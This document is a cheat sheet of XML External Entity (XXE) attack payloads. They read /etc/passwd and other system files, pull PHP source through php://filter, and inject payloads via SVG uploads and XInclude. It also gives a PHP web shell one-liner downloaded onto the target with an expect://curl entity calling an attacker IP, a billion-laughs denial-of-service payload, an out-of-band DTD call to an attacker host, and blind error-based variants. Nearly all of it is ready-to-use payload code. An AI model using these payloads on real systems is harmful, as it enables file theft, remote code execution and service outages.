
Directory listing:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aa[<!ELEMENT bb ANY><!Entity xxe SYSTEM “file:///”>]>
<root><foo>&xxe;</foo></root>
```

Listing etc Directory:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><foo>&xxe;</foo></root>
```

Display file contents:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Display file contents in URL:
```XML
<!DOCTYPE data [ <!ENTITY % d SYSTEM "file:///etc/passwd"> %d; ]>
```

LFI using ENTITY... Will have to include the entity name in the xml request somewhere ex. &company;

```XML
<!DOCTYPE email [<!ENTITY company SYSTEM "file:///etc/passwd">]>
```

Image SVG upload for LFI. Image returns the contents if vulnerable:
```XML
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Xinclude can be used when you dont control the entire XML document and are unable to define a DOCTYPE. This gets placed into the parameter like an injection:
```XML
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Read source code in PHP web Applications via form input
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

Read PHP sourcecode via HTTP request
```XML
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Creating an XML ENTITY. Add this at the top of the fields and then reference it &ENTITY; to display
```XML
<!DOCTYPE email [<!ENTITY company "Inlane Freight"> ]>
```

##### Uploading reverse shell via XML:
Create a payload for RCE:
```BASH
echo '<?php system($_REQUEST["cmd"]);?>'
```
Then start a python server or something to host it:
```bash
sudo python3 -m http.server 8080
```
Then run the following Entity (spaces are filled with $IFS to not break the parsing):
```XML
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

XXE DoS
```XML
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
```

Out of band XXE. This allows you to store a DTD on your own server and then call this:
```XML
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```



Error based XXE, trigger an error with the contents you want to get:
```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```


#### Re-purposing local DTD for error based xxe

First you have to find a local DTD that exists on this system. Look up common .dtd files and check if they exist (will see error if the file is not there):
```XML
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

Then research of existing entities in that file online, and send the blind error:
```XML
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```